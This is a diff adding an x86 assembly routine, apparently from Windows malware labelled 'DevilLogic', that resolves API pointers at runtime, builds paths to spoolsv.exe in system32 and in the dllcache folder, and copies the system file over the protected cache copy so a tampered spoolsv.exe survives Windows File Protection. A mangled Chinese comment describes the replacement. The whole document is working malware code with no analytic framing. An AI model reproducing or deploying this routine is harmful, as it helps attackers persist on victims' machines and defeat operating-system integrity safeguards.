@@ -1,0 +1,48 @@
+ReplaceDllCache:
+	push ebp
+	mov ebp, esp
+	sub esp, ReplaceDllCacheStackSize
+	mov eax, dword ptr [ebp+08h]
+	mov dword ptr [ebp-DevilLogicBaseEbp], eax
+	mov eax, dword ptr [ebp]
+	mov dword ptr [ebp-DevilLogicBaseEbp], eax
+	
+	push 75h
+	lea eax, [ebp-ReDllCacheStr]
+	push eax
+	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
+	call dword ptr [eax-xGetSystemDirectoryA]
+	
+	call PushTargetStrOnCache
+			db	'\dllcache\spoolsv.exe',0
+PushTargetStrOnCache:
+	lea eax, [ebp-ReDllCacheStr]
+	push eax
+	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
+	call dword ptr [eax-xlstrcatA]
+	
+	push 75h
+	lea eax, [ebp-FrSystemStr]
+	push eax
+	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
+	call dword ptr [eax-xGetSystemDirectoryA]
+	
+	call PushTargetStrOnSystemD
+			db	'\spoolsv.exe',0
+	PushTargetStrOnSystemD:
+	lea eax, [ebp-FrSystemStr]
+	push eax
+	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
+	call dword ptr [eax-xlstrcatA]
+	;Ìæ»»cacheÄ¿Â¼ÖÐµÄspoolsv.exe
+	push FALSE
+	lea eax, [ebp-ReDllCacheStr]
+	push eax
+	lea eax, [ebp-FrSystemStr]
+	push eax
+	mov eax, dword ptr [ebp-DevilLogicBaseEbp]
+	call dword ptr [eax-xCopyFileA]
+	mov esp, ebp
+	pop ebp
+	ret
+EndReplaceDllCache:
